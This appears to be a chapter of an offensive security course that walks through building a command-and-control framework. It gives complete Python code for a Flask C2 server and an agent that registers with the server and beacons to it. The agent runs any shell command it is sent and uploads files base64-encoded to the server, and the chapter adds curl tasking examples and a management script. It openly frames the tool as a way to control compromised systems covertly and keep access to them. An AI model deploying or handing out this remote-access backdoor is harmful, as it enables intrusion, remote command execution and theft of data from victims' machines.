# Phase 4: Post-Exploitation & Automation Frameworks
## Part 1: C2 Channel Development

### The Target: Command & Control Framework

By the end of this part, you will:
- Understand C2 architecture and communication patterns
- Build a modular C2 server with multiple channel support
- Create an agent that communicates with the C2 server
- Implement tasking and response handling
- Develop heartbeat and polling mechanisms
- Create a comprehensive C2 framework

### The Concept: Understanding C2

Think of C2 (Command & Control) like a spy agency's communication network:

- **C2 Server** = The spy agency headquarters
- **Agent** = The spy in the field
- **Beacon** = Regular check-in signals
- **Task** = Mission orders from headquarters
- **Response** = Mission results from the spy

**Why We Build C2 Systems:**
- **Remote Control**: Manage compromised systems
- **Persistent Access**: Maintain presence on target systems
- **Task Management**: Execute commands and retrieve results
- **Covert Communication**: Blend with normal traffic
- **Scalability**: Manage multiple agents simultaneously

### The Implementation: C2 Server

#### File: `~/hacking-toolkit/post-exploit/c2_server.py`

```python
#!/usr/bin/env python3
"""
c2_server.py - Command & Control Server Framework
Provides a modular C2 server with multiple communication channels.
"""

import sys
import os
import time
import json
import threading
import queue
import socket
import base64
import hashlib
import sqlite3
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
import uuid
import logging

# Try to import Flask for HTTP C2
try:
    from flask import Flask, request, jsonify, make_response
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False
    print("[!] Flask not installed. Install with: pip install flask")

@dataclass
class Agent:
    """Container for agent information"""
    agent_id: str
    hostname: str
    username: str
    platform: str
    ip_address: str
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    status: str = 'active'
    tasks: List[Dict] = field(default_factory=list)
    results: List[Dict] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'agent_id': self.agent_id,
            'hostname': self.hostname,
            'username': self.username,
            'platform': self.platform,
            'ip_address': self.ip_address,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen,
            'status': self.status,
            'tasks': self.tasks[-5:],  # Last 5 tasks
            'results': self.results[-5:]  # Last 5 results
        }

class C2Server:
    """
    Command & Control Server
    Handles agent registration, tasking, and communication
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        """
        Initialize the C2 server
        
        Args:
            config: Server configuration
        """
        self.config = config or {
            'host': '0.0.0.0',
            'http_port': 8443,
            'dns_port': 53,
            'log_level': 'INFO',
            'db_path': 'c2_database.db'
        }
        
        self.agents: Dict[str, Agent] = {}
        self.task_queue: Dict[str, List[Dict]] = {}
        self.results_queue: queue.Queue = queue.Queue()
        self.running = False
        self.lock = threading.Lock()
        
        # Setup logging
        logging.basicConfig(
            level=getattr(logging, self.config['log_level']),
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('C2Server')
        
        # Initialize database
        self._init_database()
        
        # HTTP server (if Flask is available)
        self.http_server = None
        self.http_thread = None
        
    def _init_database(self):
        """Initialize SQLite database for persistence"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            # Create agents table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS agents (
                    agent_id TEXT PRIMARY KEY,
                    hostname TEXT,
                    username TEXT,
                    platform TEXT,
                    ip_address TEXT,
                    first_seen TEXT,
                    last_seen TEXT,
                    status TEXT
                )
            ''')
            
            # Create tasks table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY,
                    agent_id TEXT,
                    command TEXT,
                    status TEXT,
                    created TEXT,
                    completed TEXT,
                    result TEXT,
                    FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
                )
            ''')
            
            # Create results table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    result_id TEXT PRIMARY KEY,
                    agent_id TEXT,
                    task_id TEXT,
                    output TEXT,
                    timestamp TEXT,
                    FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
                )
            ''')
            
            conn.commit()
            conn.close()
            self.logger.info(f"Database initialized at {self.config['db_path']}")
            
        except Exception as e:
            self.logger.error(f"Database initialization error: {e}")
    
    def register_agent(self, agent_info: Dict) -> str:
        """
        Register a new agent or update existing
        
        Args:
            agent_info: Agent information
            
        Returns:
            Agent ID
        """
        with self.lock:
            agent_id = agent_info.get('agent_id', str(uuid.uuid4()))
            
            if agent_id in self.agents:
                # Update existing agent
                agent = self.agents[agent_id]
                agent.last_seen = datetime.now().isoformat()
                agent.status = 'active'
                
                # Update database
                self._update_agent_db(agent)
                self.logger.info(f"Agent {agent_id} updated")
                
            else:
                # Create new agent
                agent = Agent(
                    agent_id=agent_id,
                    hostname=agent_info.get('hostname', 'unknown'),
                    username=agent_info.get('username', 'unknown'),
                    platform=agent_info.get('platform', 'unknown'),
                    ip_address=agent_info.get('ip_address', '0.0.0.0')
                )
                self.agents[agent_id] = agent
                self.task_queue[agent_id] = []
                
                # Save to database
                self._save_agent_db(agent)
                self.logger.info(f"New agent registered: {agent_id}")
                
                # Create welcome tasks
                self.add_task(agent_id, {
                    'command': 'whoami',
                    'description': 'Get current user'
                })
                self.add_task(agent_id, {
                    'command': 'hostname',
                    'description': 'Get system hostname'
                })
            
            return agent_id
    
    def _save_agent_db(self, agent: Agent):
        """Save agent to database"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO agents 
                (agent_id, hostname, username, platform, ip_address, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent.agent_id, agent.hostname, agent.username,
                agent.platform, agent.ip_address, agent.first_seen,
                agent.last_seen, agent.status
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            self.logger.error(f"Database save error: {e}")
    
    def _update_agent_db(self, agent: Agent):
        """Update agent in database"""
        self._save_agent_db(agent)
    
    def add_task(self, agent_id: str, task: Dict) -> str:
        """
        Add a task for an agent
        
        Args:
            agent_id: Agent ID
            task: Task dictionary
            
        Returns:
            Task ID
        """
        task_id = str(uuid.uuid4())
        task['task_id'] = task_id
        task['status'] = 'pending'
        task['created'] = datetime.now().isoformat()
        
        with self.lock:
            if agent_id in self.task_queue:
                self.task_queue[agent_id].append(task)
                
                # Save task to database
                self._save_task_db(agent_id, task)
                
                self.logger.info(f"Task {task_id} added for agent {agent_id}")
                
                # Add to agent's task list
                if agent_id in self.agents:
                    self.agents[agent_id].tasks.append(task)
                
                return task_id
            else:
                self.logger.error(f"Agent {agent_id} not found")
                return None
    
    def _save_task_db(self, agent_id: str, task: Dict):
        """Save task to database"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO tasks 
                (task_id, agent_id, command, status, created, completed)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                task['task_id'], agent_id, task['command'],
                task['status'], task['created'], task.get('completed', '')
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            self.logger.error(f"Task save error: {e}")
    
    def get_tasks(self, agent_id: str) -> List[Dict]:
        """
        Get pending tasks for an agent
        
        Args:
            agent_id: Agent ID
            
        Returns:
            List of pending tasks
        """
        with self.lock:
            if agent_id in self.task_queue:
                tasks = self.task_queue[agent_id]
                # Mark tasks as sent
                for task in tasks:
                    task['status'] = 'sent'
                    self._update_task_db(task)
                
                self.task_queue[agent_id] = []
                return tasks
            return []
    
    def _update_task_db(self, task: Dict):
        """Update task in database"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE tasks 
                SET status = ?
                WHERE task_id = ?
            ''', (task['status'], task['task_id']))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            self.logger.error(f"Task update error: {e}")
    
    def submit_result(self, agent_id: str, result: Dict):
        """
        Submit a result from an agent
        
        Args:
            agent_id: Agent ID
            result: Result dictionary
        """
        result['agent_id'] = agent_id
        result['timestamp'] = datetime.now().isoformat()
        
        # Save result to database
        self._save_result_db(agent_id, result)
        
        # Add to agent's results
        if agent_id in self.agents:
            self.agents[agent_id].results.append(result)
            self.agents[agent_id].last_seen = datetime.now().isoformat()
            self._update_agent_db(self.agents[agent_id])
        
        self.results_queue.put(result)
        self.logger.info(f"Result received from agent {agent_id}: {result.get('command', 'unknown')}")
        
        # Check if task should be marked complete
        if 'task_id' in result:
            self._complete_task(result['task_id'], result.get('output', ''))
    
    def _save_result_db(self, agent_id: str, result: Dict):
        """Save result to database"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            result_id = str(uuid.uuid4())
            cursor.execute('''
                INSERT INTO results 
                (result_id, agent_id, task_id, output, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                result_id, agent_id, 
                result.get('task_id', ''),
                result.get('output', ''),
                result['timestamp']
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            self.logger.error(f"Result save error: {e}")
    
    def _complete_task(self, task_id: str, output: str):
        """Mark a task as complete"""
        try:
            conn = sqlite3.connect(self.config['db_path'])
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE tasks 
                SET status = 'completed', completed = ?, result = ?
                WHERE task_id = ?
            ''', (datetime.now().isoformat(), output, task_id))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            self.logger.error(f"Task complete error: {e}")
    
    def get_agent_info(self, agent_id: str) -> Optional[Dict]:
        """Get information about an agent"""
        if agent_id in self.agents:
            return self.agents[agent_id].to_dict()
        return None
    
    def list_agents(self) -> List[Dict]:
        """List all agents"""
        return [agent.to_dict() for agent in self.agents.values()]
    
    def start_http_server(self):
        """Start the HTTP C2 server"""
        if not HAS_FLASK:
            self.logger.error("Flask not installed, cannot start HTTP server")
            return
        
        app = Flask(__name__)
        
        @app.route('/c2/register', methods=['POST'])
        def register():
            """Agent registration endpoint"""
            data = request.json
            if not data:
                return jsonify({'error': 'No data provided'}), 400
            
            agent_id = self.register_agent(data)
            return jsonify({'agent_id': agent_id, 'status': 'registered'})
        
        @app.route('/c2/tasks/<agent_id>', methods=['GET'])
        def get_tasks(agent_id):
            """Get tasks for an agent"""
            tasks = self.get_tasks(agent_id)
            return jsonify({'tasks': tasks})
        
        @app.route('/c2/result', methods=['POST'])
        def submit_result():
            """Submit a result from an agent"""
            data = request.json
            if not data:
                return jsonify({'error': 'No data provided'}), 400
            
            agent_id = data.get('agent_id')
            if not agent_id:
                return jsonify({'error': 'No agent_id provided'}), 400
            
            self.submit_result(agent_id, data)
            return jsonify({'status': 'success'})
        
        @app.route('/c2/agents', methods=['GET'])
        def list_agents():
            """List all agents"""
            return jsonify({'agents': self.list_agents()})
        
        @app.route('/c2/agent/<agent_id>', methods=['GET'])
        def get_agent(agent_id):
            """Get agent information"""
            agent = self.get_agent_info(agent_id)
            if agent:
                return jsonify(agent)
            return jsonify({'error': 'Agent not found'}), 404
        
        @app.route('/c2/task', methods=['POST'])
        def add_task():
            """Add a task for an agent"""
            data = request.json
            if not data:
                return jsonify({'error': 'No data provided'}), 400
            
            agent_id = data.get('agent_id')
            command = data.get('command')
            
            if not agent_id or not command:
                return jsonify({'error': 'agent_id and command required'}), 400
            
            task = {
                'command': command,
                'description': data.get('description', ''),
                'params': data.get('params', {})
            }
            
            task_id = self.add_task(agent_id, task)
            if task_id:
                return jsonify({'task_id': task_id, 'status': 'added'})
            return jsonify({'error': 'Agent not found'}), 404
        
        @app.route('/c2/results/<agent_id>', methods=['GET'])
        def get_results(agent_id):
            """Get results for an agent"""
            if agent_id in self.agents:
                return jsonify({'results': self.agents[agent_id].results[-10:]})
            return jsonify({'error': 'Agent not found'}), 404
        
        self.http_server = app
        host = self.config.get('host', '0.0.0.0')
        port = self.config.get('http_port', 8443)
        
        self.http_thread = threading.Thread(
            target=self.http_server.run,
            kwargs={'host': host, 'port': port, 'debug': False, 'threaded': True}
        )
        self.http_thread.daemon = True
        self.http_thread.start()
        
        self.logger.info(f"HTTP C2 server started on {host}:{port}")
    
    def start(self):
        """Start the C2 server"""
        self.running = True
        self.logger.info("C2 Server starting...")
        
        # Start HTTP server
        self.start_http_server()
        
        # Start DNS server (placeholder)
        self.logger.info("DNS C2 server would start here")
        
        self.logger.info("C2 Server started successfully")
    
    def stop(self):
        """Stop the C2 server"""
        self.running = False
        self.logger.info("C2 Server stopping...")

def main():
    """Interactive C2 server demonstration"""
    print("="*60)
    print("  COMMAND & CONTROL SERVER")
    print("="*60)
    
    # Configuration
    config = {
        'host': '0.0.0.0',
        'http_port': 8443,
        'log_level': 'INFO',
        'db_path': 'c2_database.db'
    }
    
    # Create and start server
    server = C2Server(config)
    server.start()
    
    print("\n[*] C2 Server is running!")
    print(f"[*] HTTP endpoint: http://localhost:{config['http_port']}")
    print("\n[*] Endpoints:")
    print("  POST /c2/register - Register an agent")
    print("  GET  /c2/tasks/<agent_id> - Get agent tasks")
    print("  POST /c2/result - Submit agent result")
    print("  GET  /c2/agents - List all agents")
    print("  GET  /c2/agent/<agent_id> - Get agent info")
    print("  POST /c2/task - Add a task")
    print("  GET  /c2/results/<agent_id> - Get agent results")
    
    print("\n[*] Press Ctrl+C to stop the server")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping C2 server...")
        server.stop()

if __name__ == "__main__":
    main()
```

### The Implementation: C2 Agent

#### File: `~/hacking-toolkit/post-exploit/c2_agent.py`

```python
#!/usr/bin/env python3
"""
c2_agent.py - Command & Control Agent
Communicates with C2 server and executes commands.
"""

import sys
import os
import time
import json
import subprocess
import platform
import socket
import threading
import uuid
import base64
import hashlib
from typing import Dict, List, Optional, Any
from datetime import datetime

# Try to import requests for HTTP communication
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("[!] requests not installed. Install with: pip install requests")

class C2Agent:
    """
    C2 Agent that communicates with C2 server
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the C2 agent
        
        Args:
            config: Agent configuration
        """
        self.config = config
        self.agent_id = config.get('agent_id', str(uuid.uuid4()))
        self.c2_url = config.get('c2_url', 'http://localhost:8443')
        self.beacon_interval = config.get('beacon_interval', 30)
        self.heartbeat_interval = config.get('heartbeat_interval', 60)
        
        # Agent information
        self.info = {
            'agent_id': self.agent_id,
            'hostname': socket.gethostname(),
            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
            'platform': platform.system(),
            'ip_address': self._get_ip_address(),
            'start_time': datetime.now().isoformat()
        }
        
        self.running = False
        self.tasks = []
        self.results = []
        
    def _get_ip_address(self) -> str:
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '0.0.0.0'
    
    def register(self) -> bool:
        """
        Register with the C2 server
        
        Returns:
            True if registration successful
        """
        if not HAS_REQUESTS:
            print("[-] requests library not available")
            return False
        
        try:
            response = requests.post(
                f"{self.c2_url}/c2/register",
                json=self.info,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'registered':
                    print(f"[+] Agent registered: {self.agent_id}")
                    return True
            
            print(f"[-] Registration failed: {response.status_code}")
            return False
            
        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False
    
    def get_tasks(self) -> List[Dict]:
        """
        Get tasks from C2 server
        
        Returns:
            List of tasks
        """
        if not HAS_REQUESTS:
            return []
        
        try:
            response = requests.get(
                f"{self.c2_url}/c2/tasks/{self.agent_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('tasks', [])
            
            return []
            
        except Exception as e:
            print(f"[-] Task fetch error: {e}")
            return []
    
    def submit_result(self, result: Dict):
        """
        Submit a result to C2 server
        
        Args:
            result: Result dictionary
        """
        if not HAS_REQUESTS:
            return
        
        try:
            result['agent_id'] = self.agent_id
            
            response = requests.post(
                f"{self.c2_url}/c2/result",
                json=result,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Result submitted: {result.get('command', 'unknown')}")
            else:
                print(f"[-] Result submission failed: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Result submission error: {e}")
    
    def execute_task(self, task: Dict) -> Dict:
        """
        Execute a task
        
        Args:
            task: Task dictionary
            
        Returns:
            Result dictionary
        """
        command = task.get('command', '')
        params = task.get('params', {})
        
        print(f"[*] Executing: {command}")
        
        result = {
            'task_id': task.get('task_id', ''),
            'command': command,
            'output': '',
            'error': '',
            'status': 'success'
        }
        
        try:
            # Built-in commands
            if command == 'whoami':
                result['output'] = self.info['username']
            elif command == 'hostname':
                result['output'] = self.info['hostname']
            elif command == 'platform':
                result['output'] = self.info['platform']
            elif command == 'ip':
                result['output'] = self.info['ip_address']
            elif command == 'info':
                result['output'] = json.dumps(self.info, indent=2)
            elif command == 'ls':
                path = params.get('path', '.')
                output = subprocess.check_output(['ls', '-la', path], text=True)
                result['output'] = output
            elif command == 'who':
                output = subprocess.check_output(['who'], text=True)
                result['output'] = output
            elif command == 'system':
                cmd = params.get('cmd', '')
                if cmd:
                    output = subprocess.check_output(cmd, shell=True, text=True)
                    result['output'] = output
            elif command == 'download':
                filepath = params.get('file', '')
                if filepath and os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                        result['output'] = content
                        result['file'] = filepath
                        result['size'] = len(content)
                else:
                    result['error'] = f"File not found: {filepath}"
                    result['status'] = 'error'
            elif command == 'sleep':
                seconds = params.get('seconds', 30)
                result['output'] = f"Sleeping for {seconds} seconds"
                time.sleep(seconds)
            elif command == 'beacon':
                interval = params.get('interval', 30)
                self.beacon_interval = interval
                result['output'] = f"Beacon interval set to {interval} seconds"
            elif command == 'exit':
                result['output'] = "Agent exiting"
                self.running = False
            else:
                # Execute as shell command
                try:
                    output = subprocess.check_output(
                        command, shell=True, text=True, stderr=subprocess.STDOUT
                    )
                    result['output'] = output
                except subprocess.CalledProcessError as e:
                    result['output'] = e.output
                    result['error'] = str(e)
                    result['status'] = 'error'
                    
        except Exception as e:
            result['output'] = str(e)
            result['error'] = str(e)
            result['status'] = 'error'
        
        return result
    
    def beacon(self):
        """
        Perform beacon check-in
        """
        print(f"[*] Beacon check-in")
        
        # Get pending tasks
        tasks = self.get_tasks()
        
        if tasks:
            print(f"[*] Received {len(tasks)} tasks")
            
            for task in tasks:
                # Execute task
                result = self.execute_task(task)
                
                # Submit result
                self.submit_result(result)
                
                # Store result
                self.results.append(result)
    
    def heartbeat(self):
        """
        Send heartbeat to C2 server
        """
        print(f"[*] Heartbeat: {self.agent_id}")
        # Simple ping to keep connection alive
        # Could be implemented as a lightweight check-in
    
    def start(self):
        """
        Start the agent
        """
        print("[*] Starting C2 Agent")
        print(f"[*] Agent ID: {self.agent_id}")
        print(f"[*] C2 URL: {self.c2_url}")
        print(f"[*] Beacon interval: {self.beacon_interval}s")
        
        # Register with C2
        if not self.register():
            print("[-] Registration failed, retrying in 10 seconds...")
            time.sleep(10)
            return
        
        self.running = True
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        # Main beacon loop
        while self.running:
            try:
                self.beacon()
                
                # Wait for next beacon
                for _ in range(self.beacon_interval):
                    if not self.running:
                        break
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n[!] Agent stopped by user")
                break
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                time.sleep(5)
        
        print("[*] Agent stopped")
    
    def _heartbeat_loop(self):
        """Heartbeat loop running in background"""
        while self.running:
            try:
                self.heartbeat()
                time.sleep(self.heartbeat_interval)
            except:
                time.sleep(10)

def main():
    """Interactive C2 agent demonstration"""
    print("="*60)
    print("  C2 AGENT")
    print("="*60)
    
    # Configuration
    config = {
        'c2_url': 'http://localhost:8443',
        'beacon_interval': 30,
        'heartbeat_interval': 60
    }
    
    # Get C2 URL from user
    c2_url = input("Enter C2 server URL (default: http://localhost:8443): ").strip()
    if c2_url:
        config['c2_url'] = c2_url
    
    # Get beacon interval
    beacon = input("Enter beacon interval in seconds (default: 30): ").strip()
    if beacon:
        try:
            config['beacon_interval'] = int(beacon)
        except:
            pass
    
    # Create and start agent
    agent = C2Agent(config)
    
    try:
        agent.start()
    except KeyboardInterrupt:
        print("\n[!] Agent interrupted")
        agent.running = False

if __name__ == "__main__":
    main()
```

### The Verification: Testing C2 Framework

#### Test 1: Start C2 Server

```bash
cd ~/hacking-toolkit/post-exploit

# Terminal 1: Start the C2 server
python3 c2_server.py

# Wait for server to start
```

**Expected Output:**
```
============================================================
  COMMAND & CONTROL SERVER
============================================================
[*] C2 Server is running!
[*] HTTP endpoint: http://localhost:8443
[*] Press Ctrl+C to stop the server
```

#### Test 2: Register Agent

```bash
# Terminal 2: Start the agent
python3 c2_agent.py
```

**Expected Output:**
```
============================================================
  C2 AGENT
============================================================
Enter C2 server URL (default: http://localhost:8443): 
Enter beacon interval in seconds (default: 30): 

[*] Starting C2 Agent
[*] Agent ID: 12345678-1234-1234-1234-123456789012
[*] C2 URL: http://localhost:8443
[*] Beacon interval: 30s
[+] Agent registered: 12345678-1234-1234-1234-123456789012
[*] Beacon check-in
[*] Received 2 tasks
[*] Executing: whoami
[+] Result submitted: whoami
[*] Executing: hostname
[+] Result submitted: hostname
```

#### Test 3: Add Tasks via API

```bash
# Terminal 3: Add tasks using curl
curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"12345678-1234-1234-1234-123456789012","command":"ls -la","description":"List directory"}'

curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"12345678-1234-1234-1234-123456789012","command":"who","description":"Show logged-in users"}'
```

#### Test 4: List Agents

```bash
# Get list of all agents
curl http://localhost:8443/c2/agents
```

### Advanced Usage: Multi-Agent Management

```python
# Multi-agent management script
cat > manage_agents.py << 'EOF'
#!/usr/bin/env python3
import requests
import json
import time

C2_URL = "http://localhost:8443"

def register_agent(hostname, username):
    """Register a new agent"""
    data = {
        'agent_id': f"agent_{hostname}",
        'hostname': hostname,
        'username': username,
        'platform': 'Linux',
        'ip_address': '192.168.1.100'
    }
    
    response = requests.post(f"{C2_URL}/c2/register", json=data)
    return response.json()

def add_task(agent_id, command, description):
    """Add a task for an agent"""
    data = {
        'agent_id': agent_id,
        'command': command,
        'description': description
    }
    
    response = requests.post(f"{C2_URL}/c2/task", json=data)
    return response.json()

def list_agents():
    """List all agents"""
    response = requests.get(f"{C2_URL}/c2/agents")
    return response.json()

def get_agent_info(agent_id):
    """Get agent information"""
    response = requests.get(f"{C2_URL}/c2/agent/{agent_id}")
    return response.json()

def get_results(agent_id):
    """Get agent results"""
    response = requests.get(f"{C2_URL}/c2/results/{agent_id}")
    return response.json()

# Main workflow
print("=== C2 Agent Management ===\n")

# List existing agents
agents = list_agents()
print(f"Active agents: {len(agents.get('agents', []))}")

# Add a new agent
print("\n[+] Registering new agent...")
result = register_agent('test-server', 'testuser')
print(f"Result: {result}")

# Add tasks
print("\n[+] Adding tasks...")
task1 = add_task('agent_test-server', 'whoami', 'Get current user')
task2 = add_task('agent_test-server', 'hostname', 'Get hostname')
print(f"Tasks added")

# Wait for agent to process
print("\n[*] Waiting for agent to process tasks...")
time.sleep(5)

# Get agent info
info = get_agent_info('agent_test-server')
if info:
    print(f"\nAgent Info:")
    print(f"  Hostname: {info.get('hostname')}")
    print(f"  Status: {info.get('status')}")
    print(f"  Tasks: {len(info.get('tasks', []))}")
    print(f"  Results: {len(info.get('results', []))}")

# Get results
results = get_results('agent_test-server')
if results:
    print(f"\nLatest Results:")
    for result in results.get('results', [])[-3:]:
        print(f"  {result.get('command')}: {result.get('output', '')[:50]}...")
EOF

python3 manage_agents.py
```

### Troubleshooting Common Issues

#### 1. Flask Not Installed

```bash
# Install Flask
pip install flask

# Or use requirements
pip install -r requirements.txt
```

#### 2. Connection Refused

```bash
# Check if server is running
curl http://localhost:8443/c2/agents

# Check port
netstat -an | grep 8443
```

#### 3. Agent Registration Fails

```python
# Try with custom agent_id
config = {
    'agent_id': 'custom_agent_123',
    'c2_url': 'http://localhost:8443'
}
```

### Reference: C2 Communication Patterns

| Pattern | Description | Use Case |
|---------|-------------|----------|
| Beacon | Periodic check-in | Stealthy, low bandwidth |
| Polling | Continuous checking | Real-time control |
| Heartbeat | Keep-alive messages | Maintain connection |
| Task Queue | Pull-based tasks | Asynchronous execution |
| Push-based | Server pushes tasks | Immediate execution |
